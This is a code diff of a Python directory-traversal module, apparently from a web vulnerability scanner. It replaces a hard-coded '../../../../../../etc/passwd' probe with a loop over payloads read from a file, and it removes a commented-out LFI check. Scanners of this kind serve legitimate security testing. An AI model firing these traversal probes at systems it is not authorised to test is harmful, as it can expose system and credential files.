@@ -15,19 +15,19 @@ class DirTravAttackModule(AttackModule):
 			print "Target is not a form or has a query string. Skipping."
 			return
 
-		print "Beginning attack -> Directory Traversal Attack\nTarget: {0}".format(endpoint.url)
-		attackCounter = 1
-		attackPattern = "../../../../../../etc/passwd"
-		result = self.launch_attack(endpoint, attackPattern)
-		if result:
-			self.attack_succeeded = True
-			# print "[DirectoryTraversal: {}/{},{}] ->".format(attackCounter, totalAttacks, attackPattern)
-			print result
-		else:
-			attackCounter += 1
+		print "Beginning attack -> Directory Traversal Attack"
+
+		f=open('DirTravPayload.txt','r')
+		for attackPattern in f.readlines():
+			payload = attackPattern.rstrip('\n')
+			result = self.launch_attack(endpoint, payload)
+			if result:
+				self.attack_succeeded = True
+				print "[DirectoryTraversal: {0}] -> {1}".format(payload, result)
+				break
 
 		if self.attack_succeeded:
-			print "Finished attack -> Vulnerable]\n"
+			print "Finished attack -> VULNERABLE\n"
 		else:
 			print "Finished attack -> Nothing found!\n"
 
@@ -55,10 +55,3 @@ class DirTravAttackModule(AttackModule):
 			else:
 				return False
 		return False
-		# =open('LfiPayload.txt','r')
-		# for i in f.readlines():
-
-		# 	ur = requests.get(url+'{}'.format(i))
-		# 	if "root" in ur.content:
-		# 		print 'Detected LFT'
-		# 		time.sleep(2)
